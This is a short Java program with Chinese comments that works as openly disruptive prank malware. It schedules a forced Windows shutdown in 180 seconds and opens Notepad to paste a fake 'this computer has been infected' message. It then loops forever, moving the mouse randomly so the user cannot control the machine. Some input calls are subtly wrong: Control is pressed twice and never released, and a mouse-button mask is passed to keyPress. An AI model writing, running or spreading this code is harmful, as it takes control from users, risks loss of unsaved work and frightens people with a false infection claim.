import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.util.Random;

public class LOOKad {
    public  static void main (String[] args) throws Exception{
        //运行机器人强制电脑关机
        Runtime.getRuntime().exec("shutdown /s /t 180");
        //创建机器人
        Robot xa = new Robot();
        //强行打开记事本
        Runtime.getRuntime().exec("notepad");
        //停顿操作
        xa.delay(1000);
        //设置剪切板的内容
        Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
        c.setContents(new StringSelection("此电脑已经中毒"),null);
        //机器人实现按ctrl+v
        xa.keyPress(KeyEvent.VK_CONTROL);
        xa.keyPress(KeyEvent.VK_V);
        xa.keyPress(KeyEvent.VK_CONTROL);
        //控制鼠标：移动至固定位置
        while (true) {
            //使鼠标乱动
            int x = new Random().nextInt(1200);
            int y = new Random().nextInt(1200);
            xa.mouseMove(x,y);
            xa.keyPress(InputEvent.BUTTON3_MASK);
        }
    }
}
